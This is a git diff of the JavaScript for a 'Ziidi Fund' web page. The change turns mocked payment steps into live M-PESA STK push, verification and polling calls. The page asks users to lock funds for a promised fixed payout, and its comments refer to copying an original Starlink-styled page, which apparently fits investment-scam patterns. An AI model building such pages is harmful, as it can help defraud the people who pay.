@@ -1,6 +1,6 @@
-// script.js - exactly same number of options as original bundle page
+// script.js - Fully functional with improved phone validation
 
-// API endpoints (dummy, but kept for structure)
+// API endpoints (update with your actual backend URLs)
 const API_ENDPOINTS = {
     initiatePayment: '/api/initiate-payment',
     normalizePhone: '/api/normalize-phone',
@@ -193,26 +193,72 @@ function setupEventListeners() {
     });
 }
 
-// ---------- helpers ----------
+// ---------- IMPROVED PHONE VALIDATION (accepts 07..., 7..., 01..., 1... and up to 10 digits) ----------
 function validatePhoneNumber(phone) {
-    let clean = phone.replace(/\D/g, '');
-    if (clean.startsWith('0')) clean = clean.substring(1);
-    if (clean.startsWith('254')) clean = clean.substring(3);
-    if (clean.length !== 9) throw new Error('Enter 9 digits (e.g., 712345678)');
-    if (!clean.startsWith('7') && !clean.startsWith('1')) throw new Error('Must start with 7 or 1');
-    return clean;
+    // Remove any spaces, dashes, parentheses
+    let clean = phone.replace(/[\s\-\(\)]/g, '');
+    
+    // Remove leading + if present
+    if (clean.startsWith('+')) {
+        clean = clean.substring(1);
+    }
+    
+    // Check length - Kenyan numbers can be 9-10 digits (with or without leading zero)
+    if (clean.length < 9 || clean.length > 10) {
+        throw new Error('Phone number must be 9 or 10 digits (e.g., 0712345678 or 712345678)');
+    }
+    
+    // Check if it's a valid Kenyan number format
+    // Accept: 07XXXXXXXX (10 digits), 7XXXXXXXX (9 digits), 01XXXXXXXX (10 digits), 1XXXXXXXX (9 digits), 254XXXXXXXXX (12 digits - handled separately)
+    const kenyanRegex = /^(?:(?:\+?254)|0)?((7|1)\d{8})$/;
+    const match = clean.match(kenyanRegex);
+    
+    if (!match) {
+        throw new Error('Enter a valid Kenyan number starting with 07, 01, 7, or 1');
+    }
+    
+    // Return the 9-digit core number (without 0 or 254)
+    return match[1];
 }
 
 function formatPhoneForDisplay(phone) {
-    if (phone.length !== 9) return phone;
-    return phone.slice(0,3) + ' ' + phone.slice(3,6) + ' ' + phone.slice(6);
+    // Format as 07XX XXX XXX or 01XX XXX XXX for display
+    if (phone.length === 9) {
+        const prefix = phone.startsWith('7') ? '07' : '01';
+        return prefix + ' ' + phone.slice(1,4) + ' ' + phone.slice(4,7) + ' ' + phone.slice(7);
+    }
+    return phone;
 }
 
 function formatPhoneForAPI(phone) {
-    return '+254' + phone;
+    // Return in international format for API (254 + 9-digit core)
+    return '254' + phone;
 }
 
-// MODAL FUNCTION - ORIGINAL STYLE (from Starlink)
+// Normalize phone using backend API
+async function normalizePhoneNumber(phone) {
+    try {
+        const response = await fetch(API_ENDPOINTS.normalizePhone, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ phone: formatPhoneForAPI(phone) })
+        });
+        
+        if (!response.ok) {
+            const error = await response.json();
+            throw new Error(error.message || 'Phone normalization failed');
+        }
+        
+        const data = await response.json();
+        return data.normalized_phone || formatPhoneForAPI(phone);
+    } catch (error) {
+        console.warn('Phone normalization failed, using local format:', error);
+        // Fallback to local formatting
+        return formatPhoneForAPI(phone);
+    }
+}
+
+// ---------- MODAL FUNCTION ----------
 function showInputModal(investment) {
     Swal.fire({
         title: 'Lock Funds',
@@ -227,9 +273,12 @@ function showInputModal(investment) {
                     </label>
                     <div class="phone-input-group">
                         <div class="phone-prefix">+254</div>
-                        <input type="tel" class="phone-input" id="swal-phone" placeholder="712 345 678" maxlength="11">
+                        <input type="tel" class="phone-input" id="swal-phone" placeholder="712 345 678" value="" maxlength="12">
                     </div>
-                    <p class="input-note">You'll recieve a prompt to lock funds. This is also where to send the your money after lock period.</p>
+                    <div class="input-note enhanced">
+                        <i class="fas fa-info-circle"></i>
+                        <span>You'll receive a prompt to lock funds. After lock period, <strong>Ksh ${investment.payout}</strong> will be sent automatically to this number.</span>
+                    </div>
                 </div>
                 
                 <div class="summary-box">
@@ -238,13 +287,13 @@ function showInputModal(investment) {
                         <span><strong>Ksh ${investment.price}</strong></span>
                     </div>
                     <div class="summary-row total">
-                        <span>Total:</span>
+                        <span>Total to pay:</span>
                         <span>Ksh ${investment.price}</span>
                     </div>
                 </div>
                 
                 <div class="secure-note">
-                    <i class="fas fa-lock"></i> Secured payment
+                    <i class="fas fa-lock"></i> Secured payment via M-PESA
                 </div>
             </div>
         `,
@@ -260,7 +309,9 @@ function showInputModal(investment) {
         preConfirm: () => {
             const phoneInput = document.getElementById('swal-phone');
             try {
-                const phoneValue = validatePhoneNumber(phoneInput.value);
+                // Remove any formatting spaces for validation
+                const rawPhone = phoneInput.value.replace(/\s/g, '');
+                const phoneValue = validatePhoneNumber(rawPhone);
                 return { phone: phoneValue };
             } catch (error) {
                 Swal.showValidationMessage(error.message);
@@ -273,14 +324,28 @@ function showInputModal(investment) {
         }
     });
 
+    // Add input formatting for better UX
     setTimeout(() => {
         const phoneInput = document.getElementById('swal-phone');
         if (phoneInput) {
             phoneInput.addEventListener('input', function(e) {
+                // Remove all non-digits
                 let value = this.value.replace(/\D/g, '');
-                if (value.length > 3) value = value.slice(0,3) + ' ' + value.slice(3);
-                if (value.length > 7) value = value.slice(0,7) + ' ' + value.slice(7);
-                this.value = value.slice(0,11);
+                
+                // Limit to 10 digits for Kenyan numbers (allowing leading zero)
+                if (value.length > 10) {
+                    value = value.slice(0, 10);
+                }
+                
+                // Format as XXX XXX XXX for readability
+                if (value.length > 3) {
+                    value = value.slice(0,3) + ' ' + value.slice(3);
+                }
+                if (value.length > 7) {
+                    value = value.slice(0,7) + ' ' + value.slice(7);
+                }
+                
+                this.value = value;
             });
             phoneInput.focus();
         }
@@ -292,42 +357,117 @@ function selectInvestment(investment) {
     showInputModal(investment);
 }
 
-// ---------- mock API & lock flow ----------
+// ---------- API FUNCTIONS ----------
 async function sendPayHeroSTK(phoneNumber, amount, description) {
-    // mock
-    return new Promise(resolve => setTimeout(() => resolve({ reference: 'REF' + Date.now() }), 800));
+    const response = await fetch(API_ENDPOINTS.initiatePayment, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+            phone_number: phoneNumber,
+            amount: amount,
+            description: `Ziidi Fund: ${description}`
+        })
+    });
+    
+    if (!response.ok) {
+        const error = await response.json();
+        throw new Error(error.message || 'Payment initiation failed');
+    }
+    
+    return await response.json();
 }
 
 async function verifyPayment(reference) {
-    return { success: true, status: 'SUCCESS' };
+    const response = await fetch(`${API_ENDPOINTS.verifyPayment}?reference=${encodeURIComponent(reference)}`);
+    
+    if (!response.ok) {
+        throw new Error('Verification failed');
+    }
+    
+    return await response.json();
 }
 
 async function pollPaymentStatus(reference) {
-    return { success: true };
+    const maxAttempts = 20;
+    const interval = 3000;
+    let attempts = 0;
+    
+    return new Promise((resolve, reject) => {
+        const poll = async () => {
+            attempts++;
+            try {
+                const result = await verifyPayment(reference);
+                
+                if (result.success && (result.status === 'SUCCESS' || result.status === 'COMPLETED')) {
+                    resolve({ success: true, data: result.data });
+                    return;
+                }
+                
+                if (result.success && (result.status === 'FAILED' || result.status === 'CANCELLED')) {
+                    reject({ success: false, error: 'Payment failed or was cancelled' });
+                    return;
+                }
+                
+                if (attempts >= maxAttempts) {
+                    reject({ success: false, error: 'Payment verification timeout' });
+                    return;
+                }
+                
+                setTimeout(poll, interval);
+            } catch (error) {
+                if (attempts >= maxAttempts) {
+                    reject({ success: false, error: 'Unable to verify payment' });
+                    return;
+                }
+                setTimeout(poll, interval);
+            }
+        };
+        
+        poll();
+    });
 }
 
-async function normalizePhoneNumber(phone) {
-    return formatPhoneForAPI(phone);
-}
-
+// ---------- MAIN LOCK FLOW ----------
 async function initiateLock(investment, recipientPhone) {
     if (isProcessing) return;
     isProcessing = true;
-
+    
     try {
-        await Swal.fire({
+        // Show initial loading
+        Swal.fire({
             title: 'Processing',
             html: '<div style="padding:0.5rem;">Please wait...</div>',
             allowOutsideClick: false,
             didOpen: () => Swal.showLoading()
         });
-
+        
+        // Normalize phone number via API
+        Swal.update({ 
+            title: 'Validating Phone', 
+            html: '<div style="padding:0.5rem;">Checking phone number...</div>'
+        });
+        
         const normalizedPhone = await normalizePhoneNumber(recipientPhone);
-        // mock payment response
-        const paymentResponse = await sendPayHeroSTK(normalizedPhone, parseInt(investment.price), investment.title);
-
+        
+        // Initiate STK push
+        Swal.update({ 
+            title: 'Sending STK Push', 
+            html: '<div style="padding:0.5rem;">Initiating M-PESA request...</div>'
+        });
+        
+        const paymentResponse = await sendPayHeroSTK(
+            normalizedPhone, 
+            parseInt(investment.price), 
+            investment.title
+        );
+        
+        if (!paymentResponse || !paymentResponse.reference) {
+            throw new Error('Failed to initiate payment');
+        }
+        
+        // Show STK sent message
         await Swal.fire({
-            title: 'STK Sent!',
+            title: 'STK Push Sent!',
             html: `
                 <div class="status-modal-content">
                     <div class="status-icon" style="color:#1d541d;">
@@ -337,26 +477,33 @@ async function initiateLock(investment, recipientPhone) {
                     <div style="background:#e6f3e6;padding:0.5rem;border-radius:10px;margin:0.5rem 0;font-size:0.85rem;">
                         ${formatPhoneForDisplay(recipientPhone)}
                     </div>
-                    <p style="font-size:0.75rem;color:#2d7a2d;">Enter PIN to lock funds</p>
+                    <p style="font-size:0.75rem;color:#2d7a2d;">Enter your M-PESA PIN to complete</p>
+                    <div style="margin-top:10px;">
+                        <small>Verifying payment automatically...</small>
+                    </div>
                 </div>
             `,
             showConfirmButton: false,
-            timer: 2500,
-            timerProgressBar: true
+            timer: 3000,
+            timerProgressBar: true,
+            allowOutsideClick: false
         });
-
-        await Swal.fire({
-            title: 'Verifying',
-            html: '<div style="padding:0.5rem;"><div class="swal2-loading" style="margin:0.5rem auto;"></div><p style="font-size:0.75rem;">Confirming payment...</p></div>',
+        
+        // Show verifying state
+        Swal.fire({
+            title: 'Verifying Payment',
+            html: '<div style="padding:0.5rem;"><div class="swal2-loading" style="margin:0.5rem auto;"></div><p style="font-size:0.75rem;">Please wait while we confirm your payment...</p></div>',
             showConfirmButton: false,
             allowOutsideClick: false
         });
-
+        
+        // Poll for payment status
         const pollResult = await pollPaymentStatus(paymentResponse.reference);
-
+        
         if (pollResult.success) {
+            // Success!
             await Swal.fire({
-                title: 'Locked!',
+                title: 'Success!',
                 html: `
                     <div class="status-modal-content">
                         <div class="status-icon" style="color:#1d541d;">
@@ -365,45 +512,52 @@ async function initiateLock(investment, recipientPhone) {
                         <div class="status-details">
                             <div style="margin-bottom:0.3rem;"><strong>${investment.title}</strong></div>
                             <div>${formatPhoneForDisplay(recipientPhone)}</div>
-                            <div style="font-weight:700;margin-top:0.3rem;">Paid Ksh ${investment.price}</div>
-                            <div style="font-weight:700;color:#0f3a0f;">Maturity: Ksh ${investment.payout}</div>
+                            <div style="font-weight:700;margin-top:0.3rem;">Paid: Ksh ${investment.price}</div>
+                            <div style="font-weight:700;color:#0f3a0f;margin-top:0.2rem;">Maturity: Ksh ${investment.payout}</div>
                         </div>
+                        <p style="font-size:0.75rem;color:#2d7a2d;margin-top:10px;">
+                            Funds will be sent automatically after lock period
+                        </p>
                     </div>
                 `,
                 confirmButtonText: 'Done',
                 confirmButtonColor: '#1d541d',
-                customClass: { confirmButton: 'swal2-confirm' }
+                customClass: {
+                    confirmButton: 'swal2-confirm'
+                }
             });
-        } else {
-            await showPaymentError('Not confirmed');
         }
+        
     } catch (error) {
-        await showPaymentError(error.message);
+        console.error('Payment error:', error);
+        
+        let errorMessage = error.message || 'Payment processing failed';
+        if (error.error) errorMessage = error.error;
+        
+        await Swal.fire({
+            title: 'Payment Status',
+            html: `
+                <div class="status-modal-content">
+                    <div class="status-icon" style="color:#f59e0b;">
+                        <i class="fas fa-exclamation-triangle"></i>
+                    </div>
+                    <p><strong>${errorMessage}</strong></p>
+                    <p style="font-size:0.7rem;color:#2d7a2d;">Check your phone and try again</p>
+                </div>
+            `,
+            confirmButtonText: 'OK',
+            confirmButtonColor: '#1d541d',
+            customClass: {
+                confirmButton: 'swal2-confirm'
+            }
+        });
     } finally {
         isProcessing = false;
         selectedInvestment = null;
     }
 }
 
-async function showPaymentError(msg) {
-    await Swal.fire({
-        title: 'Status',
-        html: `
-            <div class="status-modal-content">
-                <div class="status-icon" style="color:#f59e0b;">
-                    <i class="fas fa-exclamation-triangle"></i>
-                </div>
-                <p><strong>${msg || 'Transaction issue'}</strong></p>
-                <p style="font-size:0.7rem;">Check M-PESA</p>
-            </div>
-        `,
-        confirmButtonText: 'OK',
-        confirmButtonColor: '#1d541d',
-        customClass: { confirmButton: 'swal2-confirm' }
-    });
-}
-
-// ---------- init ----------
+// ---------- INIT ----------
 document.addEventListener('DOMContentLoaded', () => {
     renderAllInvestments();
     setupEventListeners();
